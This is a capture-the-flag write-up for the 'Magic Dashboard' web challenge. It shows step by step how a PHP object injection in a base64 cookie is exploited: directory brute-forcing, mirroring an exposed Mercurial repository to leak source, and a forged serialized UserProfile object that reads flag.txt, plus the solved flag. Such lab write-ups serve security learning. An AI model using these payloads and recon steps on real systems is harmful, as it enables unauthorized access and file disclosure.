
# Magic Dashboard 

 * Category: Web
 * Solved by the JCTF Team

## Description

> Greetings, brave adventurer! You have discovered the legendary Magic Dashboard, a mystical portal crafted by ancient web wizards. This enchanted interface holds secrets beyond imagination, with spells woven into its very code.
> Many have gazed upon its beautiful design, but few have unlocked its true magical powers. Do you possess the skills to unveil the dashboard's deepest mysteries and claim its hidden treasures?

## Solution

We register to the attached website, and are redirected to a "Magic Dashboard" which more
or less only allows users to switch between *Light Mode* and *Dark Mode*.

The preference is saved in a base64-encoded cookie:

```console
┌──(user@kali3)-[/media/sf_CTFs/appsec/Magic_Dashboard]
└─$ curl -X POST 'https://magic-dashboard.appsecil.ctf.today/index.php' \
  -H 'Cookie: PHPSESSID=a5d7484a4aa1c89b7b4c1ac8e32146d5;' -H 'Content-Type: application/x-www-form-urlencoded' -s -v --data-raw "toggle_theme=on" 2>&1 | grep -i cookie
* [HTTP/2] [1] [cookie: PHPSESSID=a5d7484a4aa1c89b7b4c1ac8e32146d5;]
> Cookie: PHPSESSID=a5d7484a4aa1c89b7b4c1ac8e32146d5;
< set-cookie: preferences=YToxOntzOjU6InRoZW1lIjtzOjQ6ImRhcmsiO30%3D; expires=Wed, 04-Jun-2025 20:08:22 GMT; Max-Age=3600

┌──(user@kali3)-[/media/sf_CTFs/appsec/Magic_Dashboard]
└─$ echo YToxOntzOjU6InRoZW1lIjtzOjQ6ImRhcmsiO30= | base64 -d
a:1:{s:5:"theme";s:4:"dark";}
```

The decoded value looks like a serialized PHP object. In this case, an array such as:

```console
┌──(user@kali3)-[/media/sf_CTFs/appsec/Magic_Dashboard]
└─$ php -r 'echo serialize(["theme" => "dark"]);'
a:1:{s:5:"theme";s:4:"dark";}
```

We can confirm this by corrupting the contents of the cookie, which displays an error similar
to "Notice: unserialize(): Error at offset 0 of 29 bytes in /var/www/html/index.php on line 30".

This must be a [PHP Object Injection](https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection) 
vulnerability: We can edit the serialized representation so that when the program calls 
`unserialize`, it will actually perform the unserialize into an object of our choice, possibly
executing some logic with variables under our control. But which object should we use? We
need some access to the source code.

Sometimes challenges such as these contain a pointer to the source code within the HTML
sources of the website, but in this case the only useful comment is:

```
<!-- NOTE: Development team - we need to remove the debug parameter (debug=1) in the deployment pipeline. Security flagged this as an issue. -->
```

When we access `https://magic-dashboard.appsecil.ctf.today/index.php?debug=1`, the following 
debug data is added to the website output, however not useful at this stage:

```
Debug: Profile data file points to /var/www/html/profile.dat 
```

So where do we find the sources? Let's use `dirsearch` to search for common locations:

```console
┌──(user@kali3)-[/media/sf_CTFs/appsec/Magic_Dashboard]
└─$ dirsearch -u https://magic-dashboard.appsecil.ctf.today/ -e *

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: artifacts | HTTP method: GET | Threads: 25 | Wordlist size: 9481

Output File: /media/sf_CTFs/appsec/Magic_Dashboard/reports/https_magic-dashboard.appsecil.ctf.today/__25-06-02_23-45-53.txt

Target: https://magic-dashboard.appsecil.ctf.today/

[23:45:53] Starting:
[23:45:56] 301 -  354B  - /.hg  ->  http://magic-dashboard.appsecil.ctf.today/.hg/
[23:45:56] 200 -    8B  - /.hg/branch
[23:45:56] 200 -  644B  - /.hg/
[23:45:56] 200 -  485B  - /.hg/store/data/
[23:45:56] 200 -   72B  - /.hg/dirstate
[23:45:56] 200 -   72B  - /.hg/store/undo
[23:45:56] 200 -   11B  - /.hg/requires
[23:45:56] 403 -  299B  - /.ht_wsr.txt
[23:46:05] 403 -  299B  - /.htaccess.bak1
[23:46:05] 403 -  299B  - /.htaccess.sample
[23:46:05] 403 -  299B  - /.htaccess.save
[23:46:05] 403 -  299B  - /.htaccess_orig
[23:46:05] 403 -  299B  - /.htaccess.orig
[23:46:05] 403 -  299B  - /.htaccess_extra
[23:46:05] 403 -  299B  - /.htaccessBAK
[23:46:05] 403 -  299B  - /.htaccess_sc
[23:46:05] 403 -  299B  - /.htaccessOLD
[23:46:05] 403 -  299B  - /.htaccessOLD2
[23:46:05] 403 -  299B  - /.htm
[23:46:05] 403 -  299B  - /.html
[23:46:05] 403 -  299B  - /.htpasswd_test
[23:46:05] 403 -  299B  - /.httr-oauth
[23:46:05] 403 -  299B  - /.htpasswds
[23:46:23] 200 -    0B  - /config.php
[23:46:28] 403 -  299B  - /flag.txt
[23:46:35] 200 -    1KB - /login.php
[23:46:45] 200 -    2KB - /register.php
[23:46:47] 403 -  299B  - /server-status/
[23:46:47] 403 -  299B  - /server-status

Task Completed
```

We found a `.hg` folder - this might contain a Mercurial repository!

```console
┌──(user@kali3)-[/media/sf_CTFs/appsec/Magic_Dashboard]
└─$ mkdir -p sources/.hg && cd sources/.hg

┌──(user@kali3)-[/media/…/appsec/Magic_Dashboard/sources/.hg]
└─$ wget --mirror --no-parent --no-host-directories --cut-dirs=1 -e robots=off https://magic-dashboard.appsecil.ctf.today/.hg/ > /dev/null 2>&1

┌──(user@kali3)-[/media/…/appsec/Magic_Dashboard/sources/.hg]
└─$ tree
.
├── 00changelog.i
├── branch
├── cache
│   ├── branch2-served
│   ├── index.html
│   ├── rbc-names-v2
│   └── rbc-revs-v2
├── dirstate
├── index.html
├── last-message.txt
├── requires
├── store
│   ├── 00changelog.d
│   ├── 00changelog.i
│   ├── 00manifest.i
│   ├── data
│   │   ├── _user_profile.php.i
│   │   └── index.html
│   ├── fncache
│   ├── index.html
│   ├── phaseroots
│   ├── requires
│   ├── undo
│   └── undo.backupfiles
├── undo.backup.branch.bck
├── undo.backup.dirstate.bck
├── undo.desc
└── wcache
    ├── checkisexec
    ├── checklink
    ├── checklink-target
    ├── checknoexec
    ├── index.html
    └── manifestfulltextcache

5 directories, 30 files
```

Now we can run `hg` commands:

```console
┌──(user@kali3)-[/media/…/appsec/Magic_Dashboard/sources/.hg]
└─$ cd ..

┌──(user@kali3)-[/media/sf_CTFs/appsec/Magic_Dashboard/sources]
└─$ hg log
changeset:   0:00c105543b6c
tag:         tip
user:        admin
date:        Wed May 28 14:59:15 2025 +0300
summary:     Add UserProfile


┌──(user@kali3)-[/media/sf_CTFs/appsec/Magic_Dashboard/sources]
└─$ hg manifest
UserProfile.php

┌──(user@kali3)-[/media/sf_CTFs/appsec/Magic_Dashboard/sources]
└─$ hg cat UserProfile.php
<?php
class UserProfile {
    public $username;
    public $dataFile = '/var/www/html/profile.dat';

    public function __construct($username) {
        $this->username = $username;
    }

    public function loadPreferences() {
        if (file_exists($this->dataFile)) {
            $data = file_get_contents($this->dataFile);
            return unserialize($data);
        }
        return ['theme' => 'light'];
    }

    public function __destruct() {
        if (isset($this->dataFile) && file_exists('/var/www/html/flag.txt')) {
            $this->dataFile = '/var/www/html/flag.txt';
        }
    }
}
```

So, obviously we want to target `UserProfile`, we craft the cookie content so that
it will undeserialize into `UserProfile`, changing the `dataFile` content to 
`"/var/www/html/flag.txt"`.

```
O:11:"UserProfile":2:{s:8:"username";s:4:"test";s:8:"dataFile";s:22:"/var/www/html/flag.txt";}
```

Let's base64-encode it and send it to the server:

```console
┌──(user@kali3)-[/media/sf_CTFs/appsec/Magic_Dashboard/sources]
└─$ echo -n 'O:11:"UserProfile":2:{s:8:"username";s:4:"test";s:8:"dataFile";s:22:"/var/www/html/flag.txt";}' | base64 -w 0
TzoxMToiVXNlclByb2ZpbGUiOjI6e3M6ODoidXNlcm5hbWUiO3M6NDoidGVzdCI7czo4OiJkYXRhRmlsZSI7czoyMjoiL3Zhci93d3cvaHRtbC9mbGFnLnR4dCI7fQ==  

┌──(user@kali3)-[/media/sf_CTFs/appsec/Magic_Dashboard/sources]
└─$ curl 'https://magic-dashboard.appsecil.ctf.today/index.php?debug=1' \
  -H 'Cookie: PHPSESSID=a5d7484a4aa1c89b7b4c1ac8e32146d5; preferences=TzoxMToiVXNlclByb2ZpbGUiOjI6e3M6ODoidXNlcm5hbWUiO3M6NDoidGVzdCI7czo4OiJkYXRhRmlsZSI7czoyMjoiL3Zhci93d3cvaHRtbC9mbGFnLnR4dCI7fQ==' -s | grep AppSec
Preferences file contents: AppSec-IL{D3struc7_w1th_M4g1c_2025}
```

The flag: `AppSec-IL{D3struc7_w1th_M4g1c_2025}`